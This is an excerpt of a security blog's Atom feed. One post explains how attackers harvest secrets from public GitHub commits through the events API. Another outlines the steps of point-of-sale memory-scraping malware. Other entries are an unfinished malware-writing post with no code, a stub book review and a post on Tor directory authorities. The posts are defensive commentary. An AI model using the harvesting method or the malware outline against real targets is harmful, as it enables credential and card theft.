<p>&ldquo;No problem!&rdquo;, you think, &ldquo;I&rsquo;ll just follow Github&rsquo;s helpful information on <a href="https://help.github.com/articles/remove-sensitive-data/">how to delete sensitive information</a> and I&rsquo;ll be fine!&rdquo;</p>

<p>Just today, I saw a <a href="http://www.devfactor.net/2014/12/30/2375-amazon-mistake/">great article</a> detailing one developer&rsquo;s experience with committing sensitive information to Github. Unfortunately, this article missed the main point. In this post, I&rsquo;m going to show exactly how hackers <em>instantly</em> harvest information committed to public Github repositories, and why deleting this information doesn&rsquo;t solve the problem.</p>

<!--more-->


<h3>Drinking from Github&rsquo;s Firehose</h3>

<p>Github has an extensive API. One of the most useful endpoints is located at <a href="https://developer.github.com/v3/activity/events/"><code>/events</code></a>. This endpoint basically provides a firehose of <em>all</em> public events as they happen. This includes account creation, code commits, and more. Just &ldquo;star&rdquo; a repository? It was published at <code>/events</code>.</p>

<p>Hackers can use this endpoint to watch for any and all code commits. Once a commit is found, they can instantly make a request to the <a href="https://developer.github.com/v3/git/commits/"><code>repos/:owner/:repo/git/commits/:sha1</code></a> endpoint to get the details for that commit. Part of these details is a reference to the project snapshot, or <code>tree</code>, for that commit (the files themselves). This tree has it&rsquo;s own SHA1, that can be used in the <a href="https://developer.github.com/v3/git/trees/"><code>repos/:owner/:repo/git/tree/:sha1?recursive=1</code></a> endpoint to get a full listing of files in the repository.</p>

<p>Each of these listings has a reference to the file&rsquo;s actual content for the commit. A request can be made to the <a href="https://developer.github.com/v3/git/blobs/"><code>/repos/:owner/:repo/git/blobs/:sha1</code></a> endpoint to get this file content, which will include the sensitive information!</p>

<p>These 4 requests are made in a matter of seconds, and can be sped up by caching the SHA1 of files to determine if the file has been changed. It&rsquo;s a good thing that no one has made a system that&rsquo;s been caching all this data this entire time, right?</p>

<h3>Say Hello to GHTorrent</h3>

<p><a href="http://ghtorrent.org/">GHTorrent</a> advertises itself as an &ldquo;offline mirror of data&rdquo;. In a nutshell, it keeps track of <em>a ton</em> of data that flows through Github&rsquo;s Events API stream, and recursively resolves dependencies to relate, say, a commit object to an event object. Currently, they suggest they have accumulated the data from 2012-2014.</p>

<p>This database has incredible potential for researchers, but also allows for hackers to pull previously deleted or changed data en masse. Granted, from what I can tell they don&rsquo;t store the actual file content (so your accidentally committed password won&rsquo;t be stored), but that doesn&rsquo;t mean that there isn&rsquo;t sensitive data to be had.</p>

<p>Consider the email address used to create a Github account, or commit a code change. Both of these actions created an event that was harvested by GHTorrent. Here&rsquo;s an example showing the details of a particularly <a href="https://github.com/jordan-wright">talented developer</a>:</p>

<p><img src="http://jordan-wright.github.io/images/blog/harvest_github/db.png"/></p>

<p>Currently, it looks like there are about 4.7 million accounts cached in GHTorrent, with over 3.4 million having a non-null email address. That&rsquo;s a lot of email addresses.</p>

<p>GHTorrent is just an example. While it doesn&rsquo;t appear to store all content, it would be trivial for hackers to reproduce the project with the added feature of searching commits for sensitive information as the events are generated. This searching can be done using keywords such as &ldquo;password&rdquo;, &ldquo;key&rdquo;, etc.</p>

<h3>The Only Way to be Safe</h3>

<p>Hopefully it&rsquo;s clear that deleting sensitive information from Github doesn&rsquo;t solve the problem. The <strong>only</strong> way to protect your assets after committing sensitive information is to consider the information compromised and to change the password/API key/whatever. Then, make sure to avoid committing this data in the future!</p>

<p>Be smart &ndash; protect your data.</p>

<p>-Jordan (<a href="https://twitter.com/jw_sec">@jw_sec</a>)</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Writing Point-of-Sale (PoS) Malware in Python]]></title>
    <link href="http://jordan-wright.github.io/blog/2014/12/29/writing-a-memory-scraper-in-python/"/>
    <updated>2014-12-29T21:32:00-06:00</updated>
    <id>http://jordan-wright.github.io/blog/2014/12/29/writing-a-memory-scraper-in-python</id>
    <content type="html"><![CDATA[<h3>Introduction</h3>

<p>I&rsquo;ve <a href="http://jordan-wright.github.io/blog/2014/12/28/what-infosec-learned-in-2014/">written before</a> that memory scraping malware is not complex. I&rsquo;ve decided to elaborate on this thought by showing just how easy it is to write a basic memory scraper in Python. It&rsquo;s my hope that, in 30 short lines of Python, you&rsquo;ll realize just how simple this type of malware is.</p>

<h3>Disclaimer</h3>

<blockquote><p>I should note that this post is only meant to highlight just how simple this type of malware is. It should go without saying that this information is in no way meant to be used for illegitimate means. Don&rsquo;t be a jerk.</p></blockquote>

<h3>POS Malware 101</h3>

<h3>Re-creating in Python</h3>

<p>We can use the excellent <code>ctypes</code> library to utilize</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[What InfoSec Learned in 2014]]></title>
    <link href="http://jordan-wright.github.io/blog/2014/12/28/what-infosec-learned-in-2014/"/>
    <updated>2014-12-28T20:38:00-06:00</updated>
    <id>http://jordan-wright.github.io/blog/2014/12/28/what-infosec-learned-in-2014</id>
    <content type="html"><![CDATA[<p><img src="http://jordan-wright.github.io/images/headers/what_infosec_2014.png"/></p>

<p><em>Busy year.</em></p>

<p>It seems as though each year brings more and more events that throw our industry into the forefront of attention &ndash; and they&rsquo;re never good. At the same time, it&rsquo;s key to remember that these events allow us to learn and evolve as an industry. Let&rsquo;s take a look at some of the key things we as an infosec industry can learn from 2014:</p>

<!--more-->


<p><img class="section_header" src="http://jordan-wright.github.io/images/blog/infosec_2014/heartbleed.png"/></p>

<h3>No Software is Safe, or Why Your Vulnerability Doesn&rsquo;t Need a Logo</h3>

<p>Heartbleed and Shellshock were arguably two of the most critical vulnerabilities our industry has seen in a while. These vulnerabilities provided a stark reminder that &ndash; as the security community often quips &ndash; no software is safe. The importance and widespread use of both OpenSSL and Bash contributed to a large, immediate impact when the vulnerabilities were announced.</p>

<p>This impact was also largely fueled by the media. Now, many people would take the stark stance that assigning names and logos to vulnerabilities is ridiculous, and I mostly agree. However, it&rsquo;s important to at least consider the benefits this approach had. Too often, vulnerabilities aren&rsquo;t patched because they simply aren&rsquo;t kept up with. It&rsquo;s mind numbing trying to keep up with every CVE-<em>xxxx</em> affecting every piece of software. In these cases, since the vulnerabilities were critical enough, this approach of marketing to the media worked really well &ndash; many systems were patched quickly<sup>1</sup>.</p>

<p>But sadly, we can already see this being overused. It seems as though anyone who thinks they have found a critical vulnerability needs to find some kind of catchy name to put with it. And I get it &ndash; CVE-2014-0160 isn&rsquo;t as dangerous sounding as <strong><em>Heartbleed</em></strong>, and CVE-2014-6271 + related isn&rsquo;t as hacker-scary sounding as <strong><em>Shellshock</em></strong>. Add logos to go with the catchy names? Marketing people <strong>love</strong> it.</p>

<p>I have no doubt that 2015 will bring with it more critical vulnerabilities in well-known, established pieces of software. I only hope that we can use the lessons-learned from Heartbleed and Shellshock to mature as an industry and approach the marketing and distribution of these details in a responsible, controlled way. Not every vulnerability needs a full marketing team behind it.</p>

<p><img class="section_header" src="http://jordan-wright.github.io/images/blog/infosec_2014/router.png"/></p>

<h3>Embedded Devices: Hacking Like it&rsquo;s 1995</h3>

<p>While the (in)security of embedded devices such as SOHO routers isn&rsquo;t particularly new, there were a substantial number of critical vulnerabilities recently released for these devices. These vulnerabilities includes <a href="https://github.com/elvanderb/TCP-32764">blatant</a> <a href="http://www.devttys0.com/2013/10/reverse-engineering-a-d-link-backdoor/">backdoors</a>, web-app security 101 <a href="http://mis.fortunecook.ie/">blunders</a>, or just bad software.</p>

<p>The primary cause for concern with these vulnerabilities is that they affect a <em>ton</em> of devices. For example, the recently reported <a href="http://mis.fortunecook.ie/">&ldquo;Misfortune Cookie&rdquo;</a> vulnerability &ndash; complete with a name and logo &ndash; claims to affect &ldquo;12 million &hellip; unique devices&rdquo;. Unfortunately, security appears to be put on the backburner when it comes to the development of embedded devices, likely due to either infosec ignorance or simply because manufacturers don&rsquo;t think attackers will target their systems &ndash; I am a fan of the latter.</p>

<p>I wholeheartedly expect to see a wider emphasis put on attacking embedded devices &ndash; particularly network devices &ndash; in 2015. The fact that in 2012 over 400,000 devices can be <a href="http://internetcensus2012.bitbucket.org/paper.html">commandeered using default passwords</a> alone should be considered a substantial threat. Sadly, it will only get worse before it gets better. The only way to fix the situation will be to continue finding and publishing vulnerabilities in these devices in the hopes that manufacturers will start placing a higher emphasis on device security.</p>

<p>Here&rsquo;s hoping for the best.</p>

<p><img class="section_header" src="http://jordan-wright.github.io/images/blog/infosec_2014/pos.png"/></p>

<h3>POS Software = POS</h3>

<p>Compromising Point-of-Sale (POS) devices became the new-hotness for cybercriminals this year. Notable breaches of retailers such as Target and Home Depot caused massive re-issuing of bank credit/debit cards, hefty financial losses, and resulted in some nice <a href="http://cdn.arstechnica.net/wp-content/uploads/2014/12/document4.pdf">class action complaint readings</a>.</p>

<p>The key thing to note about these breaches is that POS malware such as <a href="http://blog.spiderlabs.com/2013/05/alina-shedding-some-light-on-this-malware-family.html">Alina</a>, <a href="http://blog.spiderlabs.com/2014/02/jackpos-the-house-always-wins.html">JackPOS</a>, etc. <strong>is not sophisticated</strong>. It&rsquo;s not. Generally, it works like this:</p>

<ul>
<li>Check if a POS software process is running</li>
<li>Dump the memory of that process</li>
<li>Grep for 16 numbers in a row</li>
<li>Validate it&rsquo;s a valid CC using something like Luhn&rsquo;s algorithm</li>
<li>Send it off to a server</li>
<li>Repeat</li>
</ul>


<p><em>Groundbreaking.</em></p>

<p>So why did this work so well? Turns out, these POS systems (like embedded devices) have not gone through through the gamut of security scrutiny that standard software has. This makes sense, since the market-share for this software was much smaller (meaning less installs of the software than, say, Java or Flash).</p>

<p>But the criminals figured something out. Maybe market share isn&rsquo;t as important as we thought it was. Maybe there is low-hanging fruit that can give enough yield when compromised that it&rsquo;s worth looking into. A <a href="https://www.fox-it.com/en/files/2014/12/Anunak_APT-against-financial-institutions2.pdf">recent report</a> by security firm Fox-IT summed it up nicely:</p>

<blockquote><p>[Hackers] can steal $2000 a thousand times, and earn $2 million, but also they can steal it in one time and immediately get it with much less effort&hellip;</p></blockquote>

<p>Don&rsquo;t get me wrong &ndash; consumer malware families like Zeus will still have a place in the industry while there is money to be made in selling harvested information. However, I have no doubt that Target and Home Depot will only be the beginning of these retailer breaches, at least until chip-and-pin cards are the industry default.</p>

<h3>Conclusion</h3>

<p>It&rsquo;s clear that our industry is showing no signs of slowing down (and hey, I <span><i class="fa fa-heart-o"></i> job security</span>). However, we need to push forward into the next year with the mindset that <em>we&rsquo;re still losing</em>. This next year will bring more breaches, more vulnerabilities, and more lessons to be learned.</p>

<p>As always, let me know if you have any questions or comments below.</p>

<p>[1] <a href="https://jhalderm.com/pub/papers/heartbleed-imc14.pdf">https://jhalderm.com/pub/papers/heartbleed-imc14.pdf</a></p>

<p>-Jordan (<a href="http://twitter.com/jw_sec">@jw_sec</a>)</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Monitoring for Bad Tor Exit Relays Using ExitMap]]></title>
    <link href="http://jordan-wright.github.io/blog/2014/12/27/monitoring-for-bad-tor-exit-relays-using-exitmap/"/>
    <updated>2014-12-27T15:04:00-06:00</updated>
    <id>http://jordan-wright.github.io/blog/2014/12/27/monitoring-for-bad-tor-exit-relays-using-exitmap</id>
    <content type="html"><![CDATA[<h3>Introduction</h3>

<p>Tor puts quite a bit of power in the hands of exit relays.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Book Review: Black Hat Python]]></title>
    <link href="http://jordan-wright.github.io/blog/2014/12/20/book-review-black-hat-python/"/>
    <updated>2014-12-20T12:34:00-06:00</updated>
    <id>http://jordan-wright.github.io/blog/2014/12/20/book-review-black-hat-python</id>
    <content type="html"><![CDATA[<p><img src="http://jordan-wright.github.io/images/headers/blackhat_python.png"/></p>

<blockquote><p><div>Black Hat Python starts slow, but excels with Seitz&rsquo;s deep knowledge of Windows API hooking libraries.</div>
<span class="fa fa-star"></span><span class="fa fa-star"></span><span class="fa fa-star"></span><span class="fa fa-star"></span><span class="fa fa-star-o"></span></p></blockquote>

<h3>Introduction</h3>

<p>I was excited to read <a href="http://www.amazon.com/Black-Hat-Python-Programming-Pentesters/dp/1593275900/">Black Hat Python: Python Programming for Hackers and Pentesters</a> by Justin Seitz.</p>

<!--more-->


<h3>Chapters 1 Through 5: Basics and Web App Hacking</h3>

<p>This book starts slow. A good amount of readable networking basics.
Scapy is used &ndash; that&rsquo;s nice.
No <code>requests</code>? No <code>beautifulsoup</code>?</p>

<h3>Chapter 6: Extending Burp Proxy</h3>

<h3>Chapter 7: GitHub Command and Control</h3>

<p>I have written about reusing existing tools in the past (raidersec link)</p>

<h3>Chapters 8 Through 10: Windows API Automation</h3>

<h3>Chapter 11: Automating Offensive Forensics</h3>

<p>I was happy to see strong mention and use of the Volatity framework.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[What Happens if Tor Directory Authorities are Seized?]]></title>
    <link href="http://jordan-wright.github.io/blog/2014/12/19/what-happens-if-tor-directory-authorities-are-seized/"/>
    <updated>2014-12-19T18:43:00-06:00</updated>
    <id>http://jordan-wright.github.io/blog/2014/12/19/what-happens-if-tor-directory-authorities-are-seized</id>
    <content type="html"><![CDATA[<p><img src="http://jordan-wright.github.io/images/headers/tor_seized.png"/></p>

<h3>Introduction</h3>

<p>The Tor Project <a href="https://blog.torproject.org/blog/possible-upcoming-attempts-disable-tor-network">has announced</a> that they have received threats about possible upcoming attempts to disable the Tor network through the seizure of Directory Authority (DA) servers. While we don&rsquo;t know the legitimacy behind these threats, it&rsquo;s worth looking at the role DA&rsquo;s play in the Tor network, showing what effects their seizure could have on the Tor network.*</p>

<!--more-->


<h3>What are Directory Authorities?</h3>

<p>Simply put, think of the DA servers as the trusted providers of a phonebook. This phonebook &ndash; called the <em>consensus</em> &ndash; contains the complete information about each known Tor relay, and is updated every hour. When it&rsquo;s time to update the list, a majority of the directory authorities must agree on the accuracy of the new list by cryptographically signing the proposed consensus. Once this process is complete, clients are able to download the updated list of relays.</p>

<p>There are currently 10 DA&rsquo;s whose information is <a href="https://gitweb.torproject.org/tor.git/tree/src/or/config.c#n824">hardcoded into Tor clients</a> &ndash; one of which (Tonga) is used for bridge access. This means that, to keep the network updated and stable, <strong>5 DA&rsquo;s must still be operational</strong>. If a seizure attempt is able to take down 5 or more DA&rsquo;s, the network will enter an unstable state, and the integrity of any updates to the consensus cannot be guaranteed.</p>

<h3>Where are the DA&rsquo;s Located?</h3>

<p>The seizure of 5 or more DA&rsquo;s would be a large feat, but it is absolutely possible. As one commenter on HN <a href="https://news.ycombinator.com/item?id=8775028">mentioned</a>, it would only take a joint effort by the US and Germany to take down 5 DA servers. Another <a href="https://news.ycombinator.com/item?id=8775009">comment</a> provides the geolocation and organization of each DA.</p>

<h3>The Aftermath</h3>

<p>An attack seizing the DA servers would severely cripple the Tor network. The Tor Project would not only need to replace the DA servers, but would then need to introduce a client update with the new DA information. During this time, the integrity of the consensus could not be trusted, and it would be <a href="https://blog.torproject.org/blog/possible-upcoming-attempts-disable-tor-network#comment-83762">increasingly difficult</a> for new clients to be introduced into the Tor network.</p>

<h3>This Doesn&rsquo;t Solve the Problem</h3>

<p>It&rsquo;s important to note that severing the Tor network doesn&rsquo;t solve any problem. Tor provides an invaluable escape from censorship, and the means to having privacy from otherwise prying eyes. I&rsquo;m confident that the Tor Project will be resilient in recovering from any attempted takedown attempts.</p>

<h3>More Information</h3>

<p>Further information and detailed status (obtained from the updated consensus) about each of the Tor Directory Authorities can be found at the following links:</p>

<ul>
<li><a href="https://globe.torproject.org/#/relay/CF6D0AAFB385BE71B8E111FC5CFF4B47923733BC">Faravahar &ndash; 154.35.32.5:443</a></li>
<li><a href="https://globe.torproject.org/#/relay/0AD3FA884D18F89EEA2D89C019379E0E7FD94417">urras &ndash; 208.83.223.34:80</a></li>
<li><a href="https://globe.torproject.org/#/relay/7BE683E65D48141321C5ED92F075C55364AC7123">dannenberg &ndash; 193.23.244.244:443</a></li>
<li><a href="https://globe.torproject.org/#/relay/4A0CCD2DDC7995083D73F5D667100C8A5831F16D">Tonga (<strong>bridge DA</strong>) &ndash; 82.94.251.203:443</a></li>
<li><a href="https://globe.torproject.org/#/relay/9695DFC35FFEB861329B9F1AB04C46397020CE31">moria1 &ndash; 128.31.0.34:9101</a></li>
<li><a href="https://globe.torproject.org/#/relay/BD6A829255CB08E66FBE7D3748363586E46B3810">maatuska &ndash; 171.25.193.9:80</a></li>
<li><a href="https://globe.torproject.org/#/relay/F2044413DAC2E02E3D6BCF4735A19BCA1DE97281">gabelmoo &ndash; 131.188.40.189:443</a></li>
<li><a href="https://globe.torproject.org/#/relay/7EA6EAD6FD83083C538F44038BBFA077587DD755">dizum &ndash; 194.109.206.212:443</a></li>
<li><a href="https://globe.torproject.org/#/relay/74A910646BCEEFBCD2E874FC1DC997430F968145">longclaw &ndash; 199.254.238.52:443</a></li>
<li><a href="https://globe.torproject.org/#/relay/847B1F850344D7876491A54892F904934E4EB85D">tor26 &ndash; 86.59.21.38:443</a></li>
</ul>


<p>Information regarding any updates to this situation can be found on the <a href="https://blog.torproject.org/blog/">Tor Project blog</a>.</p>

<p>As always, let me know if you have any questions or comments below!</p>

<p>-Jordan (<a href="http://twitter.com/jw_sec">@jw_sec</a>)</p>

<p><em>*It is worth noting that I am by no means a Tor expert, and am relying on knowledge gained from <a href="http://jordan-wright.github.io/blog/2014/10/06/creating-tor-hidden-services-with-python/">previous</a> <a href="http://raidersec.blogspot.com/2013/09/mapping-tor-relays-and-exit-nodes.html">research</a> into the Tor network structure.</em></p>
]]></content>
  </entry>
  
</feed>
